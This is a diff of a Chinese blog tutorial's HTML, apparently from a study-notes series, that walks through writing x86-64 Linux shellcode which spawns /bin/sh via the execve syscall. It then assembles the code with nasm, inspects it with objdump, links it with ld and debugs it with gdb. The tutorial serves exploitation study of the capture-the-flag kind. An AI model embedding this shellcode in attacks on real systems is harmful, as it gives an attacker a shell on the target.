 <p>（同时在文件的开头写上下面三行的内容，其作用可以自行参考<a href="https://www.cnblogs.com/lazypigwhy/articles/14112041.html">【转】linux汇编.section .text .data 与.global - 比较懒 - 博客园 (cnblogs.com)</a></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br></pre></td></tr></table></figure>
 
 <p>最后的写入的内容应该是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">xor rax,rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
 
 
-<p>然后用nasm -f elf64 shellcode.asm这个命令去编译刚才写的那个文件（会生成一个.o文件）</p>
-<p>然后可以用 objdump -d shellcode.o （直接查看的话，是看的AT&amp;T语法的汇编，如果想看intel语法的话加上-M intel参数即可</p>
-<p><img src="/../img/HOilK7ZeAynEY5m.png"></p>
+<p>然后用 <code>nasm -f elf64 shellcode.asm</code> 这个命令去编译刚才写的那个文件（会生成一个 .o 文件）</p>
+<p>再用 <code>objdump -d shellcode.o</code> （直接查看的话，是 <code>AT&amp;T</code> 语法的汇编，如果想看 <code>intel</code> 语法的话加上 <code>-M intel</code> 参数即可）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271210300.png" alt="image-20230926230942070"></p>
 <p>此时就获取到了汇编指令的机器码。</p>
-<p>不过由于目前生成的仅仅是.o文件，没有被链接过，还无法执行或者调试。因此我们需要链接一下。</p>
-<p>输入命令ld -s -o shellcode shellcode.o 即可</p>
-<p>此时执行生成的shellcode就成功了（如下图）</p>
-<p><img src="/../img/wX7aQLldJvpA6xU.png" alt="image-20220607171010492"></p>
-<p>如果想调试的话，直接gdb挂上，然后start就可以开始调试我们写的shellcode了（如下图）</p>
-<p><img src="/../img/LKn97vORyN8bX1j.png" alt="image-20220607171241208"><br><strong>补充：推荐一个在线汇编指令转机器码的网站  <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">here</a></strong></p>
+<p>不过由于目前生成的仅仅是 .o 文件，没有被链接过，还无法执行或者调试。因此我们需要链接一下。</p>
+<p>输入命令 <code>ld -s -o shellcode shellcode.o</code> 即可</p>
+<p>此时执行生成的 <code>shellcode</code> 就成功了（如下图）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271210448.png" alt="image-20230926231037233"></p>
+<p>如果想调试的话，直接 <code>gdb</code> 挂上，然后 <code>start</code> 就可以开始调试我们写的 <code>shellcode</code> 了（如下图）</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271211378.png" alt="image-20230926231129870"><br><strong>补充：推荐一个在线汇编指令转机器码的网站  <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">here</a></strong></p>
 ]]></content>
       <categories>
         <category>学习总结</category>
